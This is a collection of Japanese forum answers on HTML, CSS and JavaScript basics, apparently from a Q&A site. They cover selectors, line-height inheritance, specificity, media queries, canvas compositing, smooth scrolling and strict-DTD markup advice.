当社は・・・中間省略・・・を目指して邁進して参ります。 </p> <h1 class="tex">経営理念</h1> <p> 生産第一をモットーに・・・以下略 </p> CSS部分 h1#greet { background: #eff; color: blue; } h1.tex { background: #cff url("../img/bg.jpg"); color: red; font-size:0.8em; } こうすることにより、idやclassとして振り分けることが可能なのです。 idは全体を通して1度しか同じ名前のものは使用できません。 classは何度でも同じ名前のものが使用できます。 idを割り振るときには#を、classを割り振るときには.を付与し、 それぞれにお好きなお名前を付けてあげてください。 なお、CSS内部に画像のパスを記入する場合は、CSSから見てどこにあるかを 記載しないと表示されませんので注意が必要です。 とここで雑学に近いお勉強コーナーを設けさせていただきたいと思います。 カスケードスタイルシート(CSS)とは、今はWEBサイトのためのものですが、 スタイルシートそのものは、WEBサイトに限らず色々なものがあるのです。 一様に装飾を目的とした装飾用言語と言われていますが、 単体としてコンピュータ言語としては扱われておりません。 そしてHTMLとCSSは別のルートを経て現在の関係に至ったのです。 何が言いたいかと言うと、HTMLとCSSは全くの別物が引っ付いて1セットになったのだと 覚えておいてほしいわけです。 基本が全くの別物ですので、HTML言語と同じように記述されても CSSでは読み込んでくれないケースが多々ありますので注意が必要です。 (両方W3Cによるものだとか言うツッコミはなしの方向でお願いします。) ほかの方が言われておりますとおりにしろとは言いませんが、 兎にも角にも独学が大切なのです。 大半の方は独学で学んでおりますので、ほかの方の意見も無下にせず、 尊重して参考になされるのが一番良い選択肢なのです。
すみません、完全に余談です。 >No.4 >この３つは継承の仕方に違いがありますが、単位無しにすると問題になる事がほとんどなくなる（期待通り表示される）と思いますので。 やっぱり訂正。 デザインの感性はデザイナー次第だから、どちらを期待するかはデザイナーが決める事ですね。 単位無し（倍率指定）では倍率を継承し、単位あり（em、%）では計算結果（pxやptに変換したもの）を継承します。 ------単位あり------------------------ p{ font-size: 16px } p{ line-height: 1.2em } p span.monologue { display: block; font-size: 12px } <p>吾輩は猫ではない。名前もある。<span class="monologue">（じゃあ何なんだよ。）</span></p> この場合、 .monologueのline-heightは、<p>に指定されたfont-sizeから計算した16×1.2＝「19.2px」を継承します。 ------単位なし------------------------ p{ font-size: 16px } p{ line-height: 1.2 } p span.monologue { display: block; font-size: 12px } <p>吾輩は猫ではない。名前もある。<span class="monologue">（じゃあ何なんだよ。）</span></p> この場合、 .monologueのline-heightは「倍率」を継承するため、.monologueに指定されたfont-sizeから計算しなおして12×1.2＝14.4pxとなります。 ------------------------ 改行が伴わない場合は、その行の最大値が行全体のline-heightとなります。 <p>の部分（.monologueの外側）のline-heightが最大となるため、19.2pxで表示されます。 p{ font-size: 16px } p{ line-height: 1.2 } p span.monologue { font-size: 12px } <p>吾輩は猫ではない。名前もある。<span class="monologue">（じゃあ何なんだよ。）</span></p> ご参考まで。
brは、通常のHTMLではほとんどでてこない、使わない、使うべきではない要素です。 <br>は、【ひとつの段落内で視覚的に改行したい】場所に使用する要素(HTML4.01)で、HTML5ではより厳しく「br elements must be used only for line breaks that are actually part of the content, as in poems or addresses. ( http://www.w3.org/TR/2011/WD-html5-20110525/text … )」--br要素は、詩やアドレスのように、実際にコンテンツの一部である改行のためにのみ使用されなければならない。 　言い換えれば、改行の間隔を広げるために使用するものではありません。そのため、通常作成するHTMLには、まず登場することのない要素です。 　では改行間隔はどう指定するかですが、日本語のフォントは英文より大きいこと。段落の始まりは一文字下げる、段落間のスペースは取らない。という慣習のため p{line-height:1.6em;margin:0;text-indent:1em;} としておくと良いです。 　そうしておけば、たとえば郵便番号をマークアップするときに <p class="postAddress"> 　<span class="zipCode">100-1000</span>東京都・・・区<br> 　東なんとか、何丁目何番地<br> 　<span class="first Name">山田</span> <span class="secondName">太郎</span> </p> のようにマークアップしておくと、期待通り他の段落と同じように広がるでしょう。このp.postAddressのみ行の高さを低くしたければ、 p.postAddress{line-height:1.4em;} とか指定します。 なお、スタイルシートの単位には、ゼロ以外は必ず単位をつけなければなりません。
http：などテキストの中から、リンクを見つけ出して自動的にリンクを作成するのはFC2のプログラムの仕業ですから、それを書き直すのが本来の方法でしょう。・・・マニュアルを探すとどこかにあるかもしれません。 　しかし、スタイルシートでの方法がないわけではありません。この質問を目にしてから、丸一日たちましたが、可能な方法を思いつきました。 p{z-index:1;}/* 一つ前に */ a{ visibility:hidden;/* 占有場所は確保するが見せない⇔display:none */ position:relative;/* 内包要素の位置基準 */ } a:after{/* 擬似要素 */ content:attr(href);/* 内容の追加 */ position:absolute;/* 絶対配置 */ top:0;left:0;/* 位置の指定 */ visibility:visible;/* 見せる */ z-index:-10;/* 背後に回す */ color:black; text-decoration:none; } 　この方法には欠点があります。 　まずＩＥでは機能しないこと・・隠されてしまいます。他のウェブ標準ブラウザ(firefox,Chrome,safari,opera)ではちゃんとリンクが消えます。海外ではIEのシェアは知れたものですが、日本でのシェアはいまだに50%程度あるので・・・ 　また、ブラウザのアドオンでテキストリンク( https://addons.mozilla.jp/firefox/details/1939 )が使えないことです。これはユーザビリティ上重大ですのでそれは放置して a{/position:relative;} a:hover:after{ content:"リンクは未検証です!!自己責任で"; position:absolute;top:-1.4em;left:0;color:red;width:20em; font-weight:bold;background-color:yellow; text-align:center; padding:0.2em 0.5em } とかで案内したほうが良いと思います。わたしならそうするでしょう。
ドメイン名は日本語ドメインでよいのです。 ※国際化ドメイン名 ( http://www.nic.ad.jp/ja/dom/idn.html ) 　ファイル名ですが、これは不可能と考えてください。あなたが保存するファイル名はあくまでascii文字です。 　それを、日本語で表示させるためには、PATH_INFOとして受け取って、サーバー側で処理する必要があります。 　たとえばwikipwdiaは、入力をPATH_INFOで受け取りますよね。 データの受け取りには QUERY_STRING いわゆる URLの?以降の部分です。formからの入力だと method=get STDN 　　　　いわゆる標準入力--キーボードからと同じ formで送信するときのmetho=POST PATH_INFO　　極端な話、ドメイン以下はすべてPATH_INFOです。 　　サーバーは要求されたファイルがないと、それをPATH_INFOに格納しては、その上のディレクトリを探します。最終的にルートまでさかのぼるのですが、ルートないしその途中に実行プログラムがあると、そのプログラムは、PATH_INF,STDN,QUERY_STRINGを使ってプログラムを実行します。 　QUERY_STRINGをURLエンコードにしたがって、元の文字列に戻すと良いでしょう。その後、 悩み/→ nayami/ 日本語→ japanese.html で書き換えます。そして open(IN "/nayami/japanese.html); while(<IN>){print OUT;} とか・・ [例] 環境変数・フォーム・クッキー ( http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/test. … )で、/test.html以降はPATH_INFOです。?以降はQUERY_STRINGです。
<!--category_area--> ～ <!--/category_area--> この中に書かれているものは、 「カテゴリ内の記事一覧」のページでしか表示されない、ということです。 (「blog-category-カテゴリ番号.html」というページ) なので、固定リンク画面(blog-entry-記事番号.html)に飛ぶと、無効になってしまうみたいです。 固定リンク画面でも表示されるためには <!--permanent_area-->　～ <!--/permanent_area--> この中に書かなくてはいけないようですが、 固定リンク画面で「<%sub_title>」や「<%topentry_title>」を使うとそれは、その記事のタイトルになるし、 「<%topentry_link>」も、その記事へのリンク、ということになります。 なので、固定リンク画面で表示されても、 同じ記事へのリンクしか表示できないみたいです。 同じカテゴリの記事一覧を取得するには、 fc2公式プラグインの「関連記事」を使うか、 以下のリンク先の記事が参考になると思います。 http://weboook.blog22.fc2.com/blog-entry-112.html
投稿の編集ページで、パーマリンクを設定してください。 必要に応じて、設定 -> パーマリンク設定 の共通設定を変更してください。
ユーザーエージェントを使用して振り分けするのが一般的だと思われます。 どのような環境で利用されているのか分からないので、詳細は別として、以下のサイト等を参考にしてみてください。 参考URL：http://www.openspc2.org/userAgent/
擬似表示ソフトを試されてはいかがでしょうか？ 下の図はそんな色覚表示の1つです。（http://www.hitachi.co.jp/universaldesign/product …） スペースの都合上他のタイプは載せませんが、他にもいくつかのタイプがありますので、「色盲 シミュレーション ツール」 検索してみてください。 あくまで、大体こんな感じくらいです。個人差もありますし、白～黒のグラデーションの方もおられます。他に白内障の方は白と明るい黄色の区別がつきにくいなど別の問題もあります。 celena さんは優しい方なんですね。celena さんが色で悩まれても零れ落ちた方の為に、ウェブ標準（見出しや段落などのマークアップを正しく行う）のサイトを作成されれば、ユーザースタイルシートでご自身が見やすいように表示することが出来る方もおられます。 参考になれば幸いです。ぜひとも、がんばってください。
唯一関数的なものはcounterプロパティかな。CSS2.1の範囲内なら:first-child,:last-child、および兄弟セレクタ+ 　p{color:red;} 　p+p{color:blue;} 　p+p+p{color:green;} とか・・。 　本題です。 「<p>タグ内の文字の色を設定しようと思ったら、設定したくない別の<p>タグ内の文字までその色になってしまい、」 　これは、HTMLがきちんとマークアップされていないからです。なぜ、同じ文書内で段落で色を変えなければならないのですか？ 1)色を変えたい段落が引用文だったら<blockquote><p>～</p></blockquote>で囲むはずです。 2)もしその段落が重要な語句を含むなら 　<p><strong>ここは大事な文章です。</strong></p> 3)それが彼の言葉で、次の段落が彼女の言葉なら 　<p class="kanichi">宮さん、こうして二人が一処に居るのも今宵限りだ。</p> 　<p class="miya">夫に不足は　ないけれど</p> 4)最初の一行だけ目だたせたい。 とか、HTMLでその部分がどのような構成要素であるか解るようにマークアップされていればスタイルシートで指定するだけです。 1) blockquote p{color:red;} 2) strong{color:red;} 3) p.kanichi{color:blue;} 　p.miya{color:red;} 4) p{color:green;} 　 p+p{color:black;} ・・・・HTMLがちゃんと書けていたら、そのような関数は必要ないはずです。くれぐれもデザインのためにclassをつけたりするものではありません。 　
cookieを消せばよいです。 「サインインしたままにする」はcookieを保存するという意味です。サイト側で設定した時間が有効期間になります。 　パソコンを再起動しても消えません。
firefoxなら、普通に見れます。 またIEを使う場合は、EmEditorなど他のテキストエディタをインストールしても良いでしょう。 　EmEditor Free ( http://jp.emeditor.com/modules/download2/rewrite … ) 　このページの下の方にFree版へのリンクがあります。有償版は1ヶ月使用できます。いずれかをインストールするとIEのソース表示に関連付けるか聞いてきますのでOKにするとIEでもソースが見れます。 　なお、ソースを見たりするなら絶対にfirefoxをお勧めします。豊富なアドオン( https://addons.mozilla.jp/firefox/ )特に開発者向けツール ( https://addons.mozilla.jp/firefox/extensions/dev … )が豊富です。その中で「Firebug ( https://addons.mozilla.jp/firefox/details/1843 )」は秀逸です。 他にも Web Developer ( https://addons.mozilla.jp/firefox/details/60 ) Html Validator ( https://addons.mozilla.jp/firefox/details/249 ) JSView ( https://addons.mozilla.jp/firefox/details/2076 ) とか・・
　忍者ホームページの「【無料プラン】広告の表示について」、 http://www.ninja.co.jp/hp/help/faq/1139/ のうち、最初の「表示されるテキスト広告が変なところに表示されます。」 http://www.ninja.co.jp/hp/help/faq/1140/ あたりが該当するかもしれません。HTMLではBODタグ、スタイルシートでは『Posiotion:absolute;』だということですね。 　症状からすると、BODタグに該当すると思われます。ご使用のページのHTMLで、それが問題ないなら、忍者に問い合わせたほうが早いかもしれません。
　ご卒業おめでとうございます。 　とても、難しい質問ですね。 　実は、どの書籍も大差ないのです。はっきり言うと『画像等をはさみながら操作手順をこなしていける内容』はそこまでなのです。それ以上は、まったく異なるアプローチでないと身につけられないのです。・・・・それが難しいと言った理由です。 　言い換えると、そこから先は「画像等をはさみながら操作手順を」示して説明することは無理なのです。 　すでに学ばれたように、HTMLは ・文書を読み解き内容を理解して、その文書を構成する要素(Element)に分解し、それぞれの要素をタグを使ってマークアップしていくメタ言語です。 　一方CSSは、 ・HTMLの構造に基づいてセレクタを使って要素を指定してプレゼンテーションを指定するものです。 　言い換えると、「この様にデザインするためにHTMLをこの様に書き、スタイルをこの様に書く」というアプローチでは、それ以上前に進めないのです。なぜなら、文書はテーマもコンセプトも実に様々なのですから。デザインに縛られていたら、デザインのためにHTMLを書くことになり「構造とプレゼンテーションの分離 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」ではなくなってしまうからです。 　ここから先に進むためには、もう一度基本に立ち返って、ひたすら文書構造をマークアップしたHTMLを作成する訓練と、出来上がったHTMLを元に、それ(HTML)には一切手を加えずスタイルシートで様々にデザインしていく訓練なのです。 　それには、少なくとも仕様書を理解し「自家薬籠中の物 ( http://kotowaza-allguide.com/si/jikayakuroutyuu. … )」にしなければなりません。 　具体的に、なぜそれが「画像等をはさみながら操作手順を」示す方法では学べないかの例を挙げましょう。 HTML 「DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　これは、HTML5の「新しい要素 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )」がとても参考になります。すなわち、文書を読み解き <div class="header"></div><div class="section"></div>のようにマークアップしなさいということなのですが、これは図では無理でしょう。 CSS 　カスケーディングスタイルシートの根幹ともいえる「5. セレクタ ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … )」や「6. 値の割り当て、カスケード処理、継承 ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … )」はどう逆立ちしても図では無理です。 　あなたに必要なことは 1) HTMLを文書構造をマークアップするように書ける様になること。このときデザインは考えない。---HTML4.01strictですよ。 　特に 　・リンクやjavascriptのターゲットでない限り無用なIDは書かない。 　・class名は文書構造を補完するものにする。 2) そのHTMLに手を加えず、様々なデザインをスタイルシートで指定してみる。 　・セレクタ--特に詳細度やカスケーディングを活用してシンプルで解りやすいものにする。 　その繰り返しでしょうね。参考書は ★HTML 4.01仕様書 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ★CSS2 邦訳 ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　(注)現在ウェブ標準とされているものはCSS2.1です。詳細度やカスケーディング部分では変更があります。 　CSS 2.1 ( http://www.w3.org/TR/CSS2/ )--邦訳がないので「変更点 ( http://www.d-toybox.com/spec/CSS2.1/appendixC/ )」 　 　
＞スマートフォンとＰＣの供用のページを作ろうとしています。 　いえ、元々HTMLはそんな区別は要りません。HTMLは 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　なのですよ。 　きちんとしたHTMLを記述すれば、本来はどのようなユーザーエージェントからも利用できるはずです。そのために、私たちはHTMLを公開手段に選択するのです。 　たとえば、ディスプレイ幅が640px以上なら問題なく利用できるようにリキッドデザインで作成するのが当面はもっとも簡単でしょう。 　その上でデザインに凝る必要が出てくるでしょうから、そのときになってスタイルシートで端末ごとにプレゼンテーションを変える工夫をすれば良いでしょう。 [例] <meta name="viewport" content="width=device-width"> <link media="only screen and (max-device-width:480px)" href="mobile.css" type="text/css" rel="stylesheet" /> <link media="screen and (min-device-width:481px)" href="wide.css" type="text/css" rel="stylesheet" /> <!--[if IE]> <link href="wide.css" rel="stylesheet" type="text/css" /> <![endif]--> 　しかし、それは後回しにしても良いでしょう。 　なぜなら、デザインで人が尋ねてくるわけではないからです。やはり決定的なものはコンテンツですからね。 　こちらに良い説明があります。 少しのコードで実装可能な15のスマートフォンサイト用小技集 | Webクリエイターボックス ( http://www.webcreatorbox.com/tech/smartphone-sni … ) ★質問部分・・過ならずDOCTYPEは書きましょう。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> <meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> <title>Untitled</title> 　必ずstrictでね。いずれHTML5になるとtransitinal的な要素や属性はなくなりますから・・ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Conformance: requirements and recommendations (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より
普通の用途では必要ない処理だと思います。 なんのためにそんな処理が必要なのですか？ 　ユーザーに入力してもらうなら、RFC 5322 - Internet Message Format ( http://tools.ietf.org/html/rfc5322 )を元に、Perlで正規表現でも書いて正しいものか否かを判断しただけでよいです。完璧を求めるなら一旦ユーザーにコードを発行して、そのメールからリンクしてもらって認証すればよいはずです。
まずは、使用する方式・言語は何かを教えて下さい。 Javaサーブレット？ ASP？ JavaScript？ ちなみに、HTMLの基礎は勉強されてますよね・・・。
No.1,No.2,No.3です。 たとえば、EmEditor (テキストエディタ) - EmEditor Free ( http://jp.emeditor.com/modules/download2/rewrite … )をインストールしてみてください。Free版はこのページの下の方です。できればFree版でないほうを使うほうがよいのですが有償です。--有償版でも一ヶ月試用出来る。 　インストールの際に、インターネットエキスプローラーのソース表示に関連付けるか?の質問があるので[OK]とすると、IEでのソース表示も文字化けせずに表示できるようになります。 　最初の質問が成り立たなくなって申し訳ありません。質問自体の回答はNo.1を参考にしてください。 　なお、Firefoxをお使いでしたら、たぶんこの質問はされなかったでしょう。ウェブ開発をされるのでしたら、開発者向けツール ( https://addons.mozilla.jp/firefox/extensions/dev … )が豊富で、しかもIEよりもウェブ標準なFirefoxは欠かせません。
＞その仕様を無視したようなブラウザはないと考えて大丈夫でしょうか？ 　質問の意味がわからないのですが、そもそもスタイルシートをサポートする時点で決まっていることです。 　また、これは特別なわけではなく、ごくごく一般的な常識としても成り立つわけです。 　たとえばスタイルシートを書くときには body{font-family:********************;} h1,h2,h3,h4,h5,h6,p{line-height:1.6em;margin:0;} p{text-indent:1em;} strong{color:red;} などタイプセレクタから書き始めますよね。(これらは仕様の上では詳細度0,0,0,1です。) ついで、 div.section p strong{font-size:1.1em;} div.section blockguote p strong{font-size:1em;} と、より詳しい設定に進んでいくと思います。より詳しく指定されている。 　--スタイルシートではselector's specificity と称される部分ですね。直訳すると選択子の明細、特殊性です。通常は詳細度と訳します。 　より詳しく、どの要素に適用させるか書かれているものがあれば、それが優先されなければ常識とずれてしまいます。 　何年何組の出席番号20番までの男の子は緑の服を着てください。 　何年何組の男の子は青い服を着てください。 　男の子は黒い服を着てください。 だとしたらよいかと言うことです。 　これをわかり易く数値で置き換えたものが詳細度です。 →5. セレクタ ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) →6. 値の割り当て、カスケード処理、継承 ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 注) この中で詳細度については、現行のCSS2.1では変更になっています。 　→6.4.3 Calculating a selector's specificity ( http://www.w3.org/TR/CSS2/cascade.html#specificity ) 　　適当な邦訳がないので、C. 変更点 ( http://www.d-toybox.com/spec/CSS2.1/appendixC/ )とあわせて読んでください。 　まあ、常識で判断できる範囲内だと思います。ただ、これを知っているかいないかでHTMLやCSSがものすごく違ったものになります。まず、デザインのためにHTMLを書く必要がなくなり、いずれもとてもシンプルでわかりやすくなるでしょう。
これを読み上げブラウザで読むと、 おといあわせ　　アスタリクタ　おといあわせのまえにいちどエフエイキュー・・ となってしまいます。アスタリクタは内容ではありませんから記述としては？です。これが英文だとさらにやっかい。 <dl class="note"> 　<dt>お問い合わせ</dt> 　<dd>お問い合わの前に一度F&Qをお読みください。</dd> 　<dt>フリーワード検索</dt> 　<dd>複数検索は半角スペースで区切って下さい。</dd> </dl> これで、note(英語では注意書き)である定義リストとしてマークアップされることになりますね。 これを、screen media用のスタイルシートで dl.note dt{font-weight:bold;} dl.note dd{margin:0.2 0 0.2em 2em;padding:0;text-indent:-1em;} dl.note dd+dt{margin-top:0.5em;} dl.note dd:before{content:"* ";} とか、auralに対しては dl.note dt{voice-family:male;} dl.note dd{voice-family:female;volume:75;} dl.note dd+dt{pause-before:200%;} とかしておくと、検索エンジンも*をテキストのひとつと認識しなくて良いでしょう。 　あくまで、HTMLではその文書の構造だけを記述し、それをどのように表現するかはスタイルシートに担わせると楽になります。 　いずれにしても、意味のない*などを書くのは間違いでしょう。 　
全体をdivなり囲って margin:0px auto; html <div class="wrapper"> ～～～～ </div> css .wrapper{margin:0px auto;} とやるのがデファクトスタンダードです
blockauote{ box-shadow: 10px 10px 10px rgba(0,0,0,0.4); -moz-box-shadow: 10px 10px 10px rgba(0,0,0,0.4); -webkit-box-shadow: 10px 10px 10px rgba(0,0,0,0.4); -o-box-shadow: 10px 10px 10px rgba(0,0,0,0.4); -ms-box-shadow: 10px 10px 10px rgba(0,0,0,0.4); } で、引用ブロックに影が付くはずですが・・
IEの8以前は、CSS3に対応していないのでつきませんが、 ★第2回 IE8以前でCSS3の表現を使うには | Think IT ( http://thinkit.co.jp/story/2011/06/20/2168 ) のような手法で対応は可能です。 　しかし、IE8以前のシェアが年々減っている現状では、労の割りにメリットが少ないので、私自身は使っていません。IE8+IE7 で18%程度-- 日本のバージョン別ブラウザシェアグラフ （StatCounter Global Statsより） ( http://lhsp.s206.xrea.com/misc/browser-share-ver … ) 　別になくても支障のない飾りですから
.globalCompositeOperationを使ってみてください。 <script> //前略 ctx.fillStyle = "rgb(200, 0, 0)"; ctx.fillRect(0, 0, 100, 100); //マスキング（？）してテキスト描画 ctx.globalCompositeOperation='destination-out'; ctx.fillText('Hello world', 20, 30); ctx.globalCompositeOperation='source-over'; //マスクを戻す ctx.clearRect( 50, 50, 10, 10);//透過確認用 //後略 </script> <p style="background-color:blue;">canvasを透過して背景が見える <canvas id="mycanvas"></canvas> </p> シャギーや半透明を細かく制御したいなら、ブラウザに任せるのではなくNo.1のような方法で自分で作らないとダメだと思います。 >パスをmoveToで文字の形にうごかして、clipしなさーい ある意味そういうことになりますが。（幅1px長さ1pxのパスを１つずつ処理していると考えて）
Y座標の移動だけで良ければこんな感じで function Down(){ scrollYBy(200,3) //Y距離，継続秒数(省略可能) } function scrollYBy(L,S){ T=10; var T=T*2|0,S=(S||2)*T,b=0,B=0,i=1,h=L/(S/2*(S/2+1)),f; (f=function (){ B+=(i<=S/2)?h*i:h*(S-i+1); B-=b=Math.round(B); scrollBy(0,b); if(i++<S)setTimeout(f,1000/T); })(); } もし重たければfunction scrollYByの２行目のTの値を10から減らしてください 逆に増やすと滑らかになります
＞自分で見た限りでは他の要素がかぶさっているという感じでは無さそうです。 　firebugでは、見つかりませんでしたか？ 　　たいていは、それでわかるはずですが・・・ 　表示→スタイルシートでスタイルシートを外すとリンクが利きませんか？ 　それでリンクが利くなら、もう一度firebugで、それぞれの要素を順番に調べてください。z-indexの大きなものがかぶさってないか？
Link_nameを呼び出せば当然のことながら、親であるA要素のname属性の値が参照されます。 nameプロパティではなく、attrですからattribute(属性)です。 idは文書中に一箇所しかありえませんからjavascriptのターゲットとして使用するのが簡単です。 HTMLの属性のnameは、通常は一箇所ですがFORMの内部などでは複数存在し得ます。 <form> 　<input type="radio" name="ABC" value="123"> 　<input type="radio" name="ABC" value="234"> 　<input type="radio" name="ABC" value="456"> とか・・ 　気をつけないとならないのは、リンクに関しては、name属性とid属性は同じ名前空間を持つことです。 BUTTON, TEXTAREA, APPLET , SELECT, FORM, FRAME, IFRAME, IMG, A, INPUT, OBJECT, MAP, PARAM, META要素がname属性を持ちえますが、そのうちA、APPLET、FORM、FRAME、 IFRAME、IMG、MAP要素に関しては、idと同じ必要があります。それ以外(BUTTON, TEXTAREA, SELECT, INPUT, OBJECT, PARAM)は、id属性値とname属性値は異なっても良いです。nameは一意である必要は、条件がありますが)ありません。
frameが否定されて１２年・・いまだにframeとは・・ →HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　frameset,transitinalはHTML4.01の勧告(1999)以来非推奨です。XHTML1.1,HTML5にはありません。 　各クラブの人が、自分のクラブをブックマークしようにもできません。そんなユーザーに不親切なものは作らないほうが・・ 　私は、ここ10年作っていません。 →フレーム 問題 HTML - Google 検索 ( https://www.google.co.jp/search?q=%E3%83%95%E3%8 … ) 　ポータルサイト風に、各クラブへのリンクを記したページを一つだけ作りましょう。
spanとselectを利用しています。 selectで選択された内容をjavascriptを使ってspanの内容を書き換えています。 詳しくは、firebugを使用してHTMLソース、CSS、javascriptを検証してください。 javascriptやスタイルシートを利用できない端末のために工夫してあるようですね。
質問の前に検索サイトの使い方を覚えるべきです。 質問された内容は全て簡単に検索できます。 人間に質問する内容ではないです。
出来ません。coordsは単に属性値で、サーバーないし内部機構に対して座標を指定するだけです。 shape="rect"でよいなら、通常のナビゲーションでよいのでは? 　普通のリンク<a href="">をブロックにして、画像の上に絶対配置して、:hoverや:active擬似クラスでborderを引く。CSS3のborder-radiusを使うと角丸や円までは対処できるでしょう。:hoverでsolid、:activeでinsetにすればよい。そのとき画像を右下に数ピクセルずらすと良いでしょう。 　複雑な図形であっても、リンクの機能自体はその周囲でよければ、borderつきの画像に置き換えれば・・。 HTML5だとcanvas要素が使えます。ただ、javascriptコードを書かなければならないので結構大変です。
あなたが作ってこられたのは、特定のディスプレイ幅のscreen端末用のサイトに過ぎません。そもそも、HTMLは、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 もし【相互運用性確保の】努力が成されなければ、 　・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［2.2.1 HTMLの略歴( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　最初は、リキッドデザイン--最近動向を考えると、最小幅780px～最大1900px程度に対応したページにすることに挑戦されたら良いでしょう。 　その次の段階として、mediaやscreen-withによってスタイルシートが切り替わるようにしておくとよいかと・・ 　下記は、最小480pxから最大無制限の簡単なサンプルです。ごく一般的なものです。 Another HTML-lint 5 ( http://www.htmllint.net/html-lint/htmllint.html# ) W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) でチェック済みのHTMK4.01strict+CSS2.1です。 タブは＿に置換してあります。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;background-color:gray;} div.header,div.section,div.footer{width:80%;min-width:480px;max-width:800px;margin:0 auto;padding:0;} body>div>*{margin:0 10px;} div.section{position:relative;min-height:300px;border:solid 1px red;} body>div.section>*{margin-left:21%;} #contentTable{position:absolute;top:0;left:0;height:100%;width:20%;margin:0;} /* 色分け */ div.header{background-color:white;} div.section{background-color:lime;} div.footer{background-color:aqua;} #contentTable{background-color:fuchsia;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>・・・</p> ＿＿<div id="contentTable"> ＿＿＿<h3>目次</h3> ＿＿＿<ol> ＿＿＿＿<li>あ行</li> ＿＿＿＿<li>か行</li> ＿＿＿＿<li>さ行</li> ＿＿＿＿<li>し行</li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2012-08-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
あ、ごめんなさい、触れて変更するのと、クリックで変更するのが混ざっちゃったみたいですよね。 触れると画像が変わるようにするだけでしたら、scriptの変更はいらなかったんですよね。 わかりにくくなってしまってごめんなさい。 ↓ <!DOCTYPE html> <html lang="ja"> <head> <meta charset="UTF-8"> <title></title> <script language="javascript"> <!-- function Frchange(){ parent.image_change.location.href="image.html"; parent.main.location.href="main.html"; } //--> </script> </head> <body> <p><img src ="01_off.gif" onClick="Frchange()" onMouseover="this.src='01_on.gif'" onMouseout="this.src='01_off.gif'"> </p> </body> </html> ↑ これでいけるんじゃないでしょうか。 フォームでもいけたかもしれません。 ↓ <!DOCTYPE html> <html lang="ja"> <head> <meta charset="UTF-8"> <title></title> <script language="javascript"> <!-- function Frchange(){ parent.image_change.location.href="image.html"; parent.main.location.href="main.html"; } //--> </script> </head> <body> <form> <input type="image" value="フレーム内を同時に変更" onclick="Frchange()" src="01_off.gif" onMouseover="this.src='01_on.gif'" onMouseout="this.src='01_off.gif'"> </form> </body> </html> ↑ ところで、 ＞<form><input type="image" value="フレーム内を同時に変更" onclick="Frchange()" src="01off.gif"></form> ＞を消してみたのですが、リンクその物が無くなります。 この部分の画像のファイル名にアンダーバーが入っていないようですが、これはコピペしたものですか？ 表示されないのは、どっちかのファイル名が間違っているのかもしれないと思ったのですが。
